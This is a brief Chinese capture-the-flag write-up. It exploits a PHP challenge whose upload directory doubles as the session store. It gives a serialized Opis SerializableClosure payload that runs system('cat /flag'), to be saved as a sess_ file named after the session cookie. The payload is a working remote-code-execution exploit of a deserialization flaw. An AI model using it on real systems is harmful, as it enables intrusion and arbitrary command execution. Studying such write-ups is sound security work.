# writeup

简单的session 反序列化。

发现题目上传路径与sess文件路径相同。所以考虑覆盖sess文件。

```php
a|C:32:"Opis\Closure\SerializableClosure":144:{a:5:{s:3:"use";a:0:{}s:8:"function";s:21:"(system('cat /flag'))";s:5:"scope";N;s:4:"this";N;s:4:"self";s:32:"00000000006a66b80000000014e7edfe";}}
```

将以上内容保存为名为
```
"sess_" + <cookieid>
```

再次访问index.php即得到flag。